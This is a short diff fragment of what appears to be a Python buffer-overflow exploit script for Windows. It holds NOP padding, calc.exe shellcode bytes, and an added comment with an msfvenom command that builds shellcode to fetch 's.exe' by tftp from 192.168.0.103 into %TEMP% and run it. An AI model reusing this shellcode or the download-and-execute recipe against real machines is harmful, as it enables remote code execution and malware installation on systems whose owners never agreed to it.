@@ -18,7 +18,8 @@ shellcode += "\x90" * 806          # crucial padding
 shellcode += "\x90" * 18           # padding
 
 # If you want some reverse shell, try to utilize the windows/exec
-# tftp <ip> trojan.exe %TEMP%\trojan.exe && %TEMP%\trojan.exe
+# msfvenom -p windows/exec CMD="tftp 192.168.0.103 get s.exe %TEMP%/s.exe  && %TEMP%/s.exe" \
+# --arch x86 --platform windows -f python -v shellcode -b "\x00"   
 # Calc.exe shellcode
 shellcode += "\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
 shellcode += "\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
